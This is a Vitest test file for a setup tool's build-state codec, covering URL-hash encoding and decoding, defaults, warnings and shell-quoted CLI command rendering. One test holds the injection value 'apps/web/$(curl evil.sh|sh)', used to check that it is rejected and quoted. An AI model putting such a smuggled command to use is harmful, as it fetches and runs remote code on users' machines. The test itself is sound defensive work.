import { describe, expect, it } from 'vitest'
import { cliCommand, decodeBuildState, encodeBuildState } from '../../shared/setup/build-state'
import { fixtureManifest } from '../../cli/test/helpers/fixtures'

const manifest = fixtureManifest()

describe('build state codec', () => {
  it('round-trips a complete state', () => {
    // Every axis is answered and the bundle list is closed over `dependsOn` (third needs second),
    // because decoding fills the unanswered axes and closes the list: only a state that is already
    // both can round-trip to itself.
    const s = {
      profile: 'demo',
      projectName: 'my app',
      answers: { pm: 'pnpm', layout: 'monorepo', appDir: 'apps/x/app', browser: 'none' },
      bundles: ['demo', 'second', 'third']
    }
    const hash = encodeBuildState(s)
    expect(hash).toBe('p=demo&n=my%20app&a=pm:pnpm,layout:monorepo,appDir:apps%2Fx%2Fapp,browser:none&b=demo,second,third')
    expect(decodeBuildState(hash, manifest)).toEqual({ state: s, warnings: [] })
  })

  it('omits the profile when there is none and reads the hash with its leading #', () => {
    const hash = encodeBuildState({ profile: null, projectName: 'x', answers: {}, bundles: [] })
    // `b=` survives empty so that "unticked everything" round-trips.
    expect(hash).toBe('n=x&b=')
    const { state } = decodeBuildState(`#${hash}`, manifest)
    expect(state.profile).toBeNull()
    expect(state.projectName).toBe('x')
    expect(state.bundles).toEqual([])
  })

  it('pre-selects when the hash carries no bundle list at all', () => {
    const { state } = decodeBuildState('n=x', manifest)
    // pm=pnpm selects demo, which suggests second.
    expect(state.bundles).toEqual(['demo', 'second'])
  })

  it('drops unknown axes, slugs and profiles with warnings and falls back to defaults', () => {
    const { state, warnings } = decodeBuildState('p=nope&a=pm:pnpm,zzz:1&b=demo,ghost', manifest)
    expect(state.profile).toBeNull()
    expect(state.answers).toEqual({ pm: 'pnpm', layout: 'single', appDir: 'apps/web/app', browser: 'cli' })
    expect(state.bundles).toEqual(['demo'])
    expect(warnings).toEqual(['unknown profile "nope"', 'unknown axis "zzz"', 'unknown bundle "ghost"'])
  })

  it('rejects an answer that is not one of the axis options', () => {
    const { state, warnings } = decodeBuildState('a=pm:brew', manifest)
    expect(state.answers.pm).toBe('pnpm')
    expect(warnings).toEqual(['pm: "brew" is not an option'])
  })

  it('renders the shortest equivalent CLI command', () => {
    const defaults = {
      profile: null,
      projectName: 'x',
      answers: { pm: 'pnpm', layout: 'single', appDir: 'apps/web/app', browser: 'cli' },
      bundles: ['demo', 'second']
    }
    // pm=pnpm selects demo, demo suggests second: nothing to add.
    expect(cliCommand(defaults, manifest)).toBe('pnpx @patrity/skills init --yes')
    expect(cliCommand({ ...defaults, answers: { ...defaults.answers, pm: 'npm' }, bundles: ['third'] }, manifest))
      .toBe('pnpx @patrity/skills init --yes --with third --answer pm=npm')
    expect(cliCommand({ ...defaults, profile: 'demo', answers: { ...defaults.answers, browser: 'none' } }, manifest))
      .toBe('pnpx @patrity/skills init --yes --profile demo')
  })

  it('leaves shell-safe values unquoted and single-quotes everything else', () => {
    const base = {
      profile: null,
      projectName: 'x',
      answers: { pm: 'pnpm', layout: 'monorepo', appDir: 'apps/web/app', browser: 'cli' },
      bundles: ['demo', 'second']
    }
    // Plain values stay bare; `layout=monorepo` and a path answer are both in the safe class.
    expect(cliCommand({ ...base, answers: { ...base.answers, appDir: 'apps/x_1/app' } }, manifest))
      .toBe('pnpx @patrity/skills init --yes --answer layout=monorepo --answer appDir=apps/x_1/app')
    // A space is not shell-safe.
    expect(cliCommand({ ...base, answers: { ...base.answers, appDir: 'apps/my app' } }, manifest))
      .toBe(String.raw`pnpx @patrity/skills init --yes --answer layout=monorepo --answer appDir='apps/my app'`)
    // A single quote is closed, escaped and reopened, so the shell still reads one literal word.
    expect(cliCommand({ ...base, answers: { ...base.answers, appDir: 'it\'s' } }, manifest))
      .toBe(String.raw`pnpx @patrity/skills init --yes --answer layout=monorepo --answer appDir='it'\''s'`)
  })

  it('never lets a command substitution out of a share link unquoted', () => {
    // The value is rejected outright at the door...
    const payload = 'apps/web/$(curl evil.sh|sh)'
    const { state, warnings } = decodeBuildState(`a=layout:monorepo,appDir:${encodeURIComponent(payload)}`, manifest)
    expect(state.answers.appDir).toBe('apps/web/app')
    expect(warnings).toEqual(['appDir: value contains unsupported characters'])
    // ...and quoted even if one reaches `cliCommand` by another route.
    const rendered = cliCommand({ profile: null, projectName: 'x', answers: { appDir: payload }, bundles: [] }, manifest)
    expect(rendered).toBe(`pnpx @patrity/skills init --yes --answer appDir='${payload}'`)
  })

  it('closes the decoded bundle list over dependsOn', () => {
    // `third` dependsOn `second`; a hand-edited link that names only `third` must not leave the
    // form showing an unticked `second` the plan installs anyway.
    expect(decodeBuildState('b=third', manifest).state.bundles).toEqual(['second', 'third'])
  })
})
